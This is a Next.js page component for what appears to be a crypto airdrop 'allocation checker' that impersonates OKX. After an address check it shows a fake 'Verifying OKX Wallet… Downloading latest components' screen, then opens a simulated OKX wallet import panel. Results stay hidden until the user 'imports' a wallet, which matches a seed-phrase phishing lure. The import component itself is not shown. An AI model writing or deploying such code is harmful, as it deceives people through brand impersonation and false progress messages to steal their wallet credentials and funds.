"use client"

import { useState, useEffect } from "react"
import Header from "@/components/header"
import AddressChecker from "@/components/address-checker"
import ResultsDisplay from "@/components/results-display"
import Footer from "@/components/footer"
import { OKXWalletSimulation } from "@/components/okx-wallet-import"

export default function Home() {
  const [checkResult, setCheckResult] = useState<any>(null)
  const [showOkxWallet, setShowOkxWallet] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [isImported, setIsImported] = useState(false)

  useEffect(() => {
    if (checkResult) {
      // Show loading screen
      setIsLoading(true)
      
      // After 5 seconds, hide loading and show OKX wallet
      const timer = setTimeout(() => {
        setIsLoading(false)
        setShowOkxWallet(true)
      }, 5000)

      return () => clearTimeout(timer)
    }
  }, [checkResult])

  const handleCloseOkxWallet = () => {
    setShowOkxWallet(false)
    // do not reset checkResult here; allow closing without losing context
  }

  return (
    <main className="min-h-screen bg-gradient-to-br from-background via-background to-muted flex flex-col">
      <Header />

      <div className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-6xl">
          {!checkResult && !isLoading ? (
            <AddressChecker onResult={setCheckResult} />
          ) : isLoading ? (
            <div className="flex flex-col items-center justify-center py-10">
              <div className="relative w-28 h-28 sm:w-32 sm:h-32 mb-6">
                {/* Glow */}
                <div className="absolute inset-0 rounded-full blur-2xl bg-green-500/20" />
                {/* Spinning ring */}
                <div className="absolute inset-0 rounded-full border-4 border-green-500/20 border-t-green-500 animate-spin" />
                {/* Logo */}
                <img src="/okx.png" alt="OKX" className="absolute inset-0 m-auto w-14 h-14 sm:w-16 sm:h-16 object-contain rounded-md drop-shadow-[0_0_20px_rgba(34,197,94,0.45)]" />
              </div>
              <h1 className="text-xl sm:text-2xl font-bold">Verifying OKX Wallet</h1>
              <p className="mt-2 text-xs sm:text-sm text-muted-foreground">Update OKX wallet is in progress…</p>
              <p className="text-[11px] sm:text-xs text-muted-foreground">Downloading latest components and verifying wallet integrity. Please wait…</p>
            </div>
          ) : (
            <div className="space-y-6">
              {isImported ? (
                <>
                  <ResultsDisplay result={checkResult} />
                  <div className="text-center">
                    <button
                      onClick={() => { setCheckResult(null); setIsImported(false) }}
                      className="px-8 py-3 bg-primary text-primary-foreground rounded-lg font-semibold hover:opacity-90 transition"
                    >
                      Check Another Address
                    </button>
                  </div>
                </>
              ) : (
                <div className="text-center text-muted-foreground">
                  <p>Please complete OKX Wallet import to view allocation.</p>
                </div>
              )}
            </div>
          )}
        </div>
      </div>

      <Footer />

      {/* OKX Wallet Import Side Panel */}
      {checkResult && (
        <OKXWalletSimulation 
          open={showOkxWallet} 
          onOpenChange={setShowOkxWallet}
          address={checkResult.address}
          allocation={checkResult.allocation}
          onWalletImported={() => setIsImported(true)}
        />
      )}
    </main>
  )
}
